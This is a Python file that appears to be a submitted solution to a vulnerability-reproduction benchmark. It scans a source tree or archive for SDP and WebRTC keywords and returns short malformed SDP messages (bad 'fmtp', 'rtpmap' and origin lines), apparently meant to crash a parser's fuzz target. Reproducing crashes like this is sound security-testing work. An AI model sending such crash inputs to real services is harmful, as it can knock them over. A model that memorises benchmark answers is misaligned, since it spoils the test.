import os
import io
import re
import tarfile
import zipfile
from typing import Iterable, Optional


class Solution:
    def _iter_source_texts_from_dir(self, root: str, max_bytes: int = 2_000_000) -> Iterable[str]:
        exts = {
            ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".inc",
            ".m", ".mm", ".rs", ".go", ".java", ".kt", ".swift", ".py",
        }
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                _, ext = os.path.splitext(fn)
                if ext.lower() not in exts:
                    continue
                p = os.path.join(dirpath, fn)
                try:
                    with open(p, "rb") as f:
                        data = f.read(max_bytes)
                except Exception:
                    continue
                yield data.decode("utf-8", errors="ignore").lower()

    def _iter_source_texts_from_tar(self, tar_path: str, max_bytes: int = 2_000_000) -> Iterable[str]:
        exts = (
            ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".inc",
            ".m", ".mm", ".rs", ".go", ".java", ".kt", ".swift", ".py",
        )
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name.lower()
                    if not name.endswith(exts):
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read(max_bytes)
                    except Exception:
                        continue
                    yield data.decode("utf-8", errors="ignore").lower()
        except Exception:
            return

    def _iter_source_texts_from_zip(self, zip_path: str, max_bytes: int = 2_000_000) -> Iterable[str]:
        exts = (
            ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".inc",
            ".m", ".mm", ".rs", ".go", ".java", ".kt", ".swift", ".py",
        )
        try:
            with zipfile.ZipFile(zip_path, "r") as zf:
                for info in zf.infolist():
                    if info.is_dir():
                        continue
                    name = info.filename.lower()
                    if not name.endswith(exts):
                        continue
                    try:
                        with zf.open(info, "r") as f:
                            data = f.read(max_bytes)
                    except Exception:
                        continue
                    yield data.decode("utf-8", errors="ignore").lower()
        except Exception:
            return

    def _scan_tokens(self, src_path: str) -> set:
        tokens = set()
        wanted = [
            "fmtp", "rtpmap", "extmap", "fingerprint", "candidate", "ice-ufrag", "ice-pwd",
            "sdp", "session description", "webrtc", "llvmfuzzertestoneinput",
        ]

        def check_text(t: str) -> None:
            for w in wanted:
                if w in t:
                    tokens.add(w)

        if os.path.isdir(src_path):
            for t in self._iter_source_texts_from_dir(src_path):
                check_text(t)
        else:
            if tarfile.is_tarfile(src_path):
                for t in self._iter_source_texts_from_tar(src_path):
                    check_text(t)
            elif zipfile.is_zipfile(src_path):
                for t in self._iter_source_texts_from_zip(src_path):
                    check_text(t)
        return tokens

    def _poc_fmtp(self) -> bytes:
        s = "\n".join(
            [
                "v=0",
                "o=- 0 0 IN IP4 127.0.0.1",
                "s=-",
                "t=0 0",
                "m=audio 9 RTP/AVP 111",
                "c=IN IP4 0.0.0.0",
                "a=rtpmap:111 opus/48000/2",
                "a=fmtp:111 abc",
            ]
        )
        return s.encode("ascii", errors="ignore")

    def _poc_rtpmap(self) -> bytes:
        s = "\n".join(
            [
                "v=0",
                "o=- 0 0 IN IP4 127.0.0.1",
                "s=-",
                "t=0 0",
                "m=audio 9 RTP/AVP 111",
                "c=IN IP4 0.0.0.0",
                "a=rtpmap:111 opus/48000/2",
                "a=rtpmap:112 abc",
            ]
        )
        return s.encode("ascii", errors="ignore")

    def _poc_origin_short(self) -> bytes:
        s = "v=0\no=abc"
        return s.encode("ascii", errors="ignore")

    def solve(self, src_path: str) -> bytes:
        tokens = self._scan_tokens(src_path)

        if "fmtp" in tokens:
            return self._poc_fmtp()
        if "rtpmap" in tokens:
            return self._poc_rtpmap()

        return self._poc_fmtp() if ("sdp" in tokens or "webrtc" in tokens) else self._poc_origin_short()